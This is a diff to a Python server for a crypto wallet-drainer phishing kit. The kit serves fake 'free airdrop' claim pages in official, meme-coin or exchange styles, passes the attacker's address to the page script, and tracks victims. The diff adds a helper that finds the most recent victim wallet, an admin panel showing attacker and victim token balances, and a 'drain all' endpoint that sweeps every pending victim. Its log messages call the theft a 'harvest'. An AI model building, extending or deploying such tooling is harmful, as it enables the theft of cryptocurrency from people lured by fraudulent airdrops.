@@ -68,6 +68,8 @@ def load_config(path: str) -> dict:
         raise SystemExit("[!] chain.chain_id 应为整数(如 31337)")
     if str(cfg["site"].get("claim_mode", "unlimited")) not in ("unlimited", "exact"):
         raise SystemExit('[!] site.claim_mode 只能是 "unlimited" 或 "exact"')
+    if str(cfg["site"].get("style", "official")) not in ("official", "meme", "exchange"):
+        raise SystemExit('[!] site.style 只能是 "official"、"meme" 或 "exchange"')
     try:
         cfg["site"]["countdown_minutes"] = int(cfg["site"]["countdown_minutes"])
         cfg["site"]["deadline"] = int(cfg["site"]["deadline"])
@@ -113,6 +115,18 @@ class EventStore:
             if item:
                 item["status"] = status
                 item["detail"] = detail
+
+    def last_victim(self) -> str | None:
+        with self.lock:
+            for ev in reversed(self.events):
+                if ev["kind"] == "connect":
+                    addr = ev["text"].rsplit(": ", 1)[-1].strip()
+                    if addr.startswith("0x"):
+                        return addr
+            for item in self.items.values():
+                if str(item.get("victim", "")).startswith("0x"):
+                    return str(item["victim"])
+        return None
 
     def snapshot(self) -> dict:
         with self.lock:
@@ -215,16 +229,21 @@ class Handler(BaseHTTPRequestHandler):
         elif path == "/admin/api/state" and not self._admin_ok():
             self._json(403, {"error": "需要口令"})
         elif path == "/admin/api/state":
-            self._json(200, STORE.snapshot())
+            self._json(200, self._state_with_balances())
         elif path == "/" or path.startswith("/index"):
             site = self.cfg["site"]
-            page = (load_template("site.html")
+            skin = {"official": "site_official.html", "meme": "site_meme.html",
+                    "exchange": "site_exchange.html"}[site["style"]]
+            page = (load_template(skin)
                     .replace("__PROJECT__", str(site["project"]))
                     .replace("__TAGLINE__", str(site["tagline"]))
                     .replace("__AMOUNT__", str(site["airdrop_amount"]))
                     .replace("__SYMBOL__", str(self.cfg["token"]["symbol"]))
                     .replace("__GASLESS__", str(site.get("gasless_text", "免 Gas 领取")))
-                    .replace("__TOKEN_NAME__", str(self.cfg["token"]["name"]))
+                    .replace("__TOKEN_NAME__", str(self.cfg["token"]["name"])))
+            self._html(200, page)
+        elif path == "/app.js":
+            page = (load_template("app.js")
                     .replace("__CONFIG_JSON__", json.dumps({
                     "rpc": self.cfg["chain"]["rpc"],
                     "chain_id": self.cfg["chain"]["chain_id"],
@@ -233,13 +252,13 @@ class Handler(BaseHTTPRequestHandler):
                     "token_name": self.cfg["token"]["name"],
                     "symbol": self.cfg["token"]["symbol"],
                     "attacker": self.cfg["attacker"]["address"],
-                    "project": str(site["project"]),
-                    "airdrop_amount": str(site["airdrop_amount"]),
-                    "countdown_minutes": site["countdown_minutes"],
-                    "deadline": site["deadline"],
-                    "claim_mode": str(site.get("claim_mode", "unlimited")),
+                    "project": str(self.cfg["site"]["project"]),
+                    "airdrop_amount": str(self.cfg["site"]["airdrop_amount"]),
+                    "countdown_minutes": self.cfg["site"]["countdown_minutes"],
+                    "deadline": self.cfg["site"]["deadline"],
+                    "claim_mode": str(self.cfg["site"].get("claim_mode", "unlimited")),
                 }, ensure_ascii=False)))
-            self._html(200, page)
+            self._send(200, page.encode("utf-8"), "application/javascript; charset=utf-8")
         else:
             self._json(404, {"error": "not found"})
 
@@ -303,15 +322,39 @@ class Handler(BaseHTTPRequestHandler):
         else:
             self._json(400, {"error": "未知事件类型"})
 
+    def _state_with_balances(self) -> dict:
+        state = STORE.snapshot()
+        cfg = self.cfg
+        rpc, token = cfg["chain"]["rpc"], cfg["token"]["address"]
+        victim = STORE.last_victim()
+        state["meta"] = {"symbol": cfg["token"]["symbol"],
+                         "attacker": cfg["attacker"]["address"]}
+        state["balances"] = {
+            "attacker": drain.balance_of(rpc, token, cfg["attacker"]["address"]),
+            "victim": ({"address": victim,
+                        "amount": drain.balance_of(rpc, token, victim)}
+                       if victim else None),
+        }
+        return state
+
     def _handle_drain(self):
         body = self._body()
+        if body.get("all"):
+            results = []
+            for item in STORE.snapshot()["items"]:
+                if item["status"] == "pending":
+                    results.append(self._drain_item(item))
+            self._json(200, {"drained_count": len(results), "results": results})
+            return
         item = STORE.get(int(body.get("itemId", 0)))
         if not item:
             self._json(404, {"error": "待收割项不存在"})
             return
+        self._json(200, self._drain_item(item))
+
+    def _drain_item(self, item: dict) -> dict:
         if item["status"] != "pending":
-            self._json(409, {"error": f"该项状态为 {item['status']},不能重复收割"})
-            return
+            return {"itemId": item["id"], "error": f"状态为 {item['status']},不能重复收割"}
         result = run_drain(self.cfg, item)
         STORE.set_status(item["id"], "drained",
                          f"已收割 {result['drained']};受害者 {result['after']['victim']},"
@@ -319,7 +362,8 @@ class Handler(BaseHTTPRequestHandler):
         STORE.add_event("drain",
                         f"收割完成:受害者 -{result['drained']},"
                         f"攻击者现有 {result['after']['attacker']}")
-        self._json(200, result)
+        result["itemId"] = item["id"]
+        return result
 
 
 def main() -> int:
